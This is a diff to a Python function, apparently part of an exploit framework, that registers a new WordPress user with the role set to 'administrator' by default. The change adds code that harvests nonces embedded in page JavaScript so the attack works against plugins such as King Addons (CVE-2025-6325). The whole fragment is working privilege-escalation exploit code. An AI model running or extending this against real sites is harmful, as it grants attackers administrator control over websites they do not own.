@@ -69,11 +69,22 @@ def _register_role(base, http, recipe, creds):
         data[recipe["pass_confirm_field"]] = creds["password"]
     data[recipe["role_param"]] = recipe.get("role_value", "administrator")
     # Many real registration handlers require a nonce lifted from the form page.
+    # Some print it as a hidden <input> (nonce_from.field); others localize it
+    # into a page's JS instead (nonce_from.key, e.g. King Addons CVE-2025-6325's
+    # register_nonce inside king_addons_login_register_vars) -- and a plugin
+    # localizing several same-keyed nonces in different objects needs
+    # nonce_from.object to disambiguate which one (see _harvest_js_nonce).
     nf = recipe.get("nonce_from")
     if nf:
-        nonce = _harvest_input_nonce(base, http, base + nf["url"], nf["field"])
+        if nf.get("field"):
+            nonce = _harvest_input_nonce(base, http, base + nf["url"], nf["field"])
+            param = nf.get("param", nf["field"])
+        else:
+            nonce = _exploit._harvest_js_nonce(http, base + nf["url"], nf["key"],
+                                               object_name=nf.get("object"))
+            param = nf.get("param", nf["key"])
         if nonce:
-            data[nf.get("param", nf["field"])] = nonce
+            data[param] = nonce
     http.post(base + recipe["endpoint"], data=data)
     return {"username": creds["username"], "password": creds["password"]}
 
